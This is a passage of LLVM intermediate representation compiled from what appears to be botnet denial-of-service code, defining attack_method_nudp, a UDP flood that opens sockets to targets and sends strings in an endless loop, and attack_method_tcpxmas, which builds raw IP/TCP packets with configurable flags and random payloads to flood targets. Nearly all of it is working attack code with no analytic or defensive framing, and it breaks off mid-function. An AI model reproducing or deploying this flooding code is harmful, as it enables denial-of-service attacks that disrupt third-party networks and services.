declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #11
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_nudp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca [22 x i8*], align 16
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 0
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i8** %7, align 16
  %8 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 1
  %9 = tail call signext i8 @random_hex()
  %10 = sext i8 %9 to i64
  %11 = tail call signext i8 @random_hex()
  %12 = sext i8 %11 to i64
  %13 = add nsw i64 %12, %10
  %14 = getelementptr inbounds [31 x i8], [31 x i8]* @.str.2, i64 0, i64 %13
  store i8* %14, i8** %8, align 8
  %15 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 2
  %16 = tail call signext i8 @random_hex()
  %17 = sext i8 %16 to i64
  %18 = tail call signext i8 @random_hex()
  %19 = sext i8 %18 to i64
  %20 = add nsw i64 %19, %17
  %21 = getelementptr inbounds [31 x i8], [31 x i8]* @.str.3, i64 0, i64 %20
  store i8* %21, i8** %15, align 16
  %22 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 3
  store i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i64 0, i64 0), i8** %22, align 8
  %23 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 4
  store i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i64 0, i64 0), i8** %23, align 16
  %24 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 5
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8** %24, align 8
  %25 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 6
  %26 = tail call signext i8 @random_hex()
  %27 = sext i8 %26 to i64
  %28 = tail call signext i8 @random_hex()
  %29 = sext i8 %28 to i64
  %30 = add nsw i64 %29, %27
  %31 = tail call signext i8 @random_hex()
  %32 = sext i8 %31 to i64
  %33 = add nsw i64 %30, %32
  %34 = tail call signext i8 @random_hex()
  %35 = sext i8 %34 to i64
  %36 = add nsw i64 %33, %35
  %37 = tail call signext i8 @random_hex()
  %38 = sext i8 %37 to i64
  %39 = add nsw i64 %36, %38
  %40 = tail call signext i8 @random_hex()
  %41 = sext i8 %40 to i64
  %42 = add nsw i64 %39, %41
  %43 = tail call signext i8 @random_hex()
  %44 = sext i8 %43 to i64
  %45 = add nsw i64 %42, %44
  %46 = tail call signext i8 @random_hex()
  %47 = sext i8 %46 to i64
  %48 = add i64 %45, %47
  %49 = tail call signext i8 @random_hex()
  %50 = sext i8 %49 to i64
  %51 = add i64 %48, %50
  %52 = tail call signext i8 @random_hex()
  %53 = sext i8 %52 to i64
  %54 = add i64 %51, %53
  %55 = tail call signext i8 @random_hex()
  %56 = sext i8 %55 to i64
  %57 = add i64 %54, %56
  %58 = tail call signext i8 @random_hex()
  %59 = sext i8 %58 to i64
  %60 = add i64 %57, %59
  %61 = tail call signext i8 @random_hex()
  %62 = sext i8 %61 to i64
  %63 = add i64 %60, %62
  %64 = tail call signext i8 @random_hex()
  %65 = sext i8 %64 to i64
  %66 = add i64 %63, %65
  %sext = shl i64 %66, 32
  %67 = ashr exact i64 %sext, 32
  %68 = getelementptr inbounds [1 x i8], [1 x i8]* @.str.6, i64 0, i64 %67
  store i8* %68, i8** %25, align 16
  %69 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 7
  store i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.7, i64 0, i64 0), i8** %69, align 8
  %70 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 8
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i8** %70, align 16
  %71 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 9
  store i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.9, i64 0, i64 0), i8** %71, align 8
  %72 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 10
  store i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.10, i64 0, i64 0), i8** %72, align 16
  %73 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 11
  store i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.11, i64 0, i64 0), i8** %73, align 8
  %74 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 12
  store i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i64 0, i64 0), i8** %74, align 16
  %75 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 13
  store i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i64 0, i64 0), i8** %75, align 8
  %76 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 14
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.14, i64 0, i64 0), i8** %76, align 16
  %77 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 15
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0), i8** %77, align 8
  %78 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 16
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0), i8** %78, align 16
  %79 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 17
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.17, i64 0, i64 0), i8** %79, align 8
  %80 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 18
  store i8* getelementptr inbounds ([174 x i8], [174 x i8]* @.str.18, i64 0, i64 0), i8** %80, align 16
  %81 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 19
  store i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.19, i64 0, i64 0), i8** %81, align 8
  %82 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 20
  store i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i64 0, i64 0), i8** %82, align 16
  %83 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 21
  store i8* getelementptr inbounds ([163 x i8], [163 x i8]* @.str.21, i64 0, i64 0), i8** %83, align 8
  %84 = zext i8 %0 to i64
  %85 = tail call noalias i8* @calloc(i64 %84, i64 4) #11
  %86 = bitcast i8* %85 to i32*
  %87 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %88 = trunc i32 %87 to i16
  %89 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %90 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1024)
  %91 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %92 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %92, i8 0, i64 16, i32 4, i1 false)
  %93 = and i32 %89, 65535
  %94 = icmp eq i32 %93, 65535
  br i1 %94, label %98, label %95

; <label>:95:                                     ; preds = %4
  %96 = trunc i32 %89 to i16
  %97 = tail call zeroext i16 @htons(i16 zeroext %96) #12
  br label %98

; <label>:98:                                     ; preds = %4, %95
  %.053 = phi i16 [ %97, %95 ], [ 0, %4 ]
  %99 = zext i8 %0 to i32
  %100 = icmp eq i8 %0, 0
  br i1 %100, label %.preheader, label %.lr.ph57

.lr.ph57:                                         ; preds = %98
  %101 = and i32 %87, 65535
  %102 = icmp eq i32 %101, 65535
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %106 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %107 = zext i8 %0 to i64
  br label %109

.preheader.loopexit:                              ; preds = %131
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %98
  %108 = icmp ne i8 %0, 0
  br label %.loopexit

; <label>:109:                                    ; preds = %.lr.ph57, %131
  %indvars.iv = phi i64 [ 0, %.lr.ph57 ], [ %indvars.iv.next, %131 ]
  br i1 %102, label %112, label %110

; <label>:110:                                    ; preds = %109
  %111 = call zeroext i16 @htons(i16 zeroext %88) #12
  br label %112

; <label>:112:                                    ; preds = %109, %110
  %.sink = phi i16 [ %111, %110 ], [ 0, %109 ]
  %113 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %114 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %114, align 2
  %115 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %116 = getelementptr inbounds i32, i32* %86, i64 %indvars.iv
  store i32 %115, i32* %116, align 4
  %117 = icmp eq i32 %115, -1
  br i1 %117, label %118, label %119

; <label>:118:                                    ; preds = %112
  ret void

; <label>:119:                                    ; preds = %112
  store i16 2, i16* %103, align 4
  store i16 %.053, i16* %104, align 2
  store i32 0, i32* %105, align 4
  %120 = load i32, i32* %116, align 4
  %121 = call i32 @bind(i32 %120, %struct.sockaddr* nonnull %106, i32 16) #11
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %123 = load i8, i8* %122, align 4
  %124 = icmp ult i8 %123, 32
  br i1 %124, label %125, label %131

; <label>:125:                                    ; preds = %119
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %127 = load i32, i32* %126, align 4
  %128 = call i32 @ntohl(i32 %127) #12
  %129 = call i32 @htonl(i32 %128) #12
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %129, i32* %130, align 4
  br label %131

; <label>:131:                                    ; preds = %125, %119
  %132 = load i32, i32* %116, align 4
  %133 = bitcast %struct.attack_target* %113 to %struct.sockaddr*
  %134 = call i32 @connect(i32 %132, %struct.sockaddr* %133, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %135 = icmp slt i64 %indvars.iv.next, %107
  br i1 %135, label %109, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %108, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.155 = phi i32 [ %.mux, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %136 = sext i32 %.155 to i64
  %137 = getelementptr inbounds i32, i32* %86, i64 %136
  %138 = load i32, i32* %137, align 4
  %139 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 %136
  %140 = load i8*, i8** %139, align 8
  %141 = call i64 @strlen(i8* %140) #14
  %142 = add i64 %141, 1
  %143 = call i64 @send(i32 %138, i8* %140, i64 %142, i32 16384) #11
  %144 = add nsw i32 %.155, 1
  %145 = icmp slt i32 %144, %99
  %brmerge = or i1 %145, %108
  %.mux = select i1 %145, i32 %144, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %.lr.ph
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @random_hex() local_unnamed_addr #0 {
  %1 = tail call i32 @rand() #11
  %2 = srem i32 %1, 257
  %3 = trunc i32 %2 to i8
  ret i8 %3
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #7

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #11
  %12 = bitcast i8* %11 to %struct.attack_xmas_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #11
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 1)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #11
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %81, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.preheader151.lr.ph

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  br label %.preheader151

; <label>:81:                                     ; preds = %42
  %82 = call i32 @close(i32 %40) #11
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %83 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %.loopexit152, label %.lr.ph161.preheader

.lr.ph161.preheader:                              ; preds = %.preheader151
  br label %.lr.ph161

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153
  %85 = icmp eq i8 %0, 0
  %86 = and i32 %17, 65535
  %87 = icmp eq i32 %86, 65535
  %88 = icmp eq i8 %39, 0
  %89 = sext i32 %37 to i64
  %90 = add nsw i64 %89, 20
  %91 = trunc i64 %90 to i16
  %92 = trunc i64 %90 to i32
  %93 = add nsw i64 %89, 40
  br label %.loopexit

.lr.ph161:                                        ; preds = %.lr.ph161.preheader, %.backedge
  %94 = phi i32 [ %218, %.backedge ], [ %83, %.lr.ph161.preheader ]
  %95 = call i32 (i32, i32, ...) @fcntl(i32 %94, i32 3, i32 0) #11
  %96 = or i32 %95, 2048
  %97 = call i32 (i32, i32, ...) @fcntl(i32 %94, i32 4, i32 %96) #11
  store i16 2, i16* %48, align 4
  %98 = load i32, i32* %5, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %99, i32 2
  %101 = load i8, i8* %100, align 4
  %102 = icmp ult i8 %101, 32
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %99, i32 1
  %104 = load i32, i32* %103, align 4
  br i1 %102, label %105, label %108

; <label>:105:                                    ; preds = %.lr.ph161
  %106 = call i32 @ntohl(i32 %104) #12
  %107 = call i32 @htonl(i32 %106) #12
  br label %108

; <label>:108:                                    ; preds = %.lr.ph161, %105
  %.sink = phi i32 [ %107, %105 ], [ %104, %.lr.ph161 ]
  store i32 %.sink, i32* %49, align 4
  br i1 %51, label %111, label %109

; <label>:109:                                    ; preds = %108
  %110 = call zeroext i16 @htons(i16 zeroext %24) #12
  br label %111

; <label>:111:                                    ; preds = %108, %109
  %.sink3 = phi i16 [ %110, %109 ], [ 0, %108 ]
  store i16 %.sink3, i16* %52, align 2
  %112 = call i32 @connect(i32 %94, %struct.sockaddr* nonnull %53, i32 16) #11
  %113 = call i64 @time(i64* null) #11
  br label %114

; <label>:114:                                    ; preds = %220, %111
  store i32 16, i32* %8, align 4
  %115 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #11
  %116 = trunc i64 %115 to i32
  %117 = icmp eq i32 %116, -1
  br i1 %117, label %.loopexit150.loopexit, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i32, i32* %56, align 4
  %120 = load i32, i32* %49, align 4
  %121 = icmp eq i32 %119, %120
  br i1 %121, label %122, label %220

; <label>:122:                                    ; preds = %118
  %sext = shl i64 %115, 32
  %123 = ashr exact i64 %sext, 32
  %124 = icmp ugt i64 %123, 40
  br i1 %124, label %125, label %220

; <label>:125:                                    ; preds = %122
  %126 = load i16, i16* %58, align 4
  %127 = load i16, i16* %52, align 2
  %128 = icmp eq i16 %126, %127
  br i1 %128, label %129, label %220

; <label>:129:                                    ; preds = %125
  %130 = load i16, i16* %60, align 16
  %131 = and i16 %130, 4608
  %132 = icmp eq i16 %131, 4608
  br i1 %132, label %133, label %213

; <label>:133:                                    ; preds = %129
  %134 = load i32, i32* %5, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %135, i32 0
  store i32 %120, i32* %136, align 4
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @ntohl(i32 %138) #12
  %140 = load i32, i32* %5, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %141, i32 1
  store i32 %139, i32* %142, align 4
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %144 = load i32, i32* %143, align 4
  %145 = call i32 @ntohl(i32 %144) #12
  %146 = load i32, i32* %5, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %147, i32 2
  store i32 %145, i32* %148, align 4
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %150 = load i16, i16* %149, align 2
  %151 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %147, i32 3
  store i16 %150, i16* %151, align 4
  %152 = load i16, i16* %52, align 2
  %153 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %147, i32 4
  store i16 %152, i16* %153, align 2
  %154 = call noalias i8* @malloc(i64 %62) #11
  %155 = load i32, i32* %5, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i8*, i8** %14, i64 %156
  store i8* %154, i8** %157, align 8
  %158 = getelementptr inbounds i8, i8* %154, i64 20
  %159 = bitcast i8* %158 to %struct.tcphdr*
  %160 = getelementptr inbounds i8, i8* %154, i64 40
  store i8 69, i8* %154, align 4
  %161 = getelementptr inbounds i8, i8* %154, i64 1
  store i8 %16, i8* %161, align 1
  %162 = call zeroext i16 @htons(i16 zeroext %63) #12
  %163 = getelementptr inbounds i8, i8* %154, i64 2
  %164 = bitcast i8* %163 to i16*
  store i16 %162, i16* %164, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %18) #12
  %166 = getelementptr inbounds i8, i8* %154, i64 4
  %167 = bitcast i8* %166 to i16*
  store i16 %165, i16* %167, align 4
  %168 = getelementptr inbounds i8, i8* %154, i64 8
  store i8 %20, i8* %168, align 4
  br i1 %64, label %173, label %169

; <label>:169:                                    ; preds = %133
  %170 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %171 = getelementptr inbounds i8, i8* %154, i64 6
  %172 = bitcast i8* %171 to i16*
  store i16 %170, i16* %172, align 2
  br label %173

; <label>:173:                                    ; preds = %133, %169
  %174 = getelementptr inbounds i8, i8* %154, i64 9
  store i8 6, i8* %174, align 1
  %175 = load i32, i32* @LOCAL_ADDR, align 4
  %176 = getelementptr inbounds i8, i8* %154, i64 12
  %177 = bitcast i8* %176 to i32*
  store i32 %175, i32* %177, align 4
  %178 = load i32, i32* %5, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %179, i32 0
  %181 = load i32, i32* %180, align 4
  %182 = getelementptr inbounds i8, i8* %154, i64 16
  %183 = bitcast i8* %182 to i32*
  store i32 %181, i32* %183, align 4
  %184 = load i32, i32* %5, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %185, i32 3
  %187 = load i16, i16* %186, align 4
  %188 = bitcast i8* %158 to i16*
  store i16 %187, i16* %188, align 4
  %189 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %185, i32 4
  %190 = load i16, i16* %189, align 2
  %191 = getelementptr inbounds i8, i8* %154, i64 22
  %192 = bitcast i8* %191 to i16*
  store i16 %190, i16* %192, align 2
  %193 = load i32, i32* %5, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %194, i32 2
  %196 = load i32, i32* %195, align 4
  %197 = getelementptr inbounds i8, i8* %154, i64 24
  %198 = bitcast i8* %197 to i32*
  store i32 %196, i32* %198, align 4
  %199 = load i32, i32* %5, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %200, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = getelementptr inbounds i8, i8* %154, i64 28
  %204 = bitcast i8* %203 to i32*
  store i32 %202, i32* %204, align 4
  %205 = getelementptr inbounds i8, i8* %154, i64 32
  %206 = bitcast i8* %205 to i16*
  %207 = load i16, i16* %206, align 4
  %208 = getelementptr inbounds i8, i8* %154, i64 34
  %209 = bitcast i8* %208 to i16*
  store i16 0, i16* %209, align 2
  %210 = and i16 %207, -16369
  %211 = or i16 %210, 128
  %212 = or i16 %80, %211
  store i16 %212, i16* %206, align 4
  call void @rand_str(i8* %160, i32 %37)
  br label %.loopexit152

; <label>:213:                                    ; preds = %129
  %214 = and i16 %130, 1280
  %215 = icmp eq i16 %214, 0
  br i1 %215, label %220, label %216

; <label>:216:                                    ; preds = %213
  %217 = call i32 @close(i32 %94) #11
  br label %.backedge

.backedge:                                        ; preds = %216, %224
  %218 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %219 = icmp eq i32 %218, -1
  br i1 %219, label %.loopexit152.loopexit, label %.lr.ph161

; <label>:220:                                    ; preds = %213, %125, %122, %118
  %221 = call i64 @time(i64* null) #11
  %222 = sub nsw i64 %221, %113
  %223 = icmp sgt i64 %222, 10
  br i1 %223, label %224, label %114

; <label>:224:                                    ; preds = %220
  %225 = call i32 @close(i32 %94) #11
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit, %.preheader151, %173
  %.1 = phi %struct.tcphdr* [ %159, %173 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ]
  %226 = load i32, i32* %5, align 4
  %227 = add nsw i32 %226, 1
  store i32 %227, i32* %5, align 4
  %228 = icmp slt i32 %227, %46
  br i1 %228, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %240
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %85, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %240
  %storemerge139160 = phi i32 [ %278, %240 ], [ 0, %.lr.ph.preheader ]
  %229 = sext i32 %storemerge139160 to i64
  %230 = getelementptr inbounds i8*, i8** %14, i64 %229
  %231 = load i8*, i8** %230, align 8
  %232 = bitcast i8* %231 to %struct.iphdr*
  %233 = getelementptr inbounds i8, i8* %231, i64 20
  %234 = getelementptr inbounds i8, i8* %231, i64 40
  br i1 %87, label %235, label %238

; <label>:235:                                    ; preds = %.lr.ph
  %236 = getelementptr inbounds i8, i8* %231, i64 4
  %237 = bitcast i8* %236 to i16*
  store i16 0, i16* %237, align 4
  br label %238

; <label>:238:                                    ; preds = %235, %.lr.ph
  br i1 %88, label %240, label %239

; <label>:239:                                    ; preds = %238
  call void @rand_str(i8* %234, i32 %37)
  br label %240

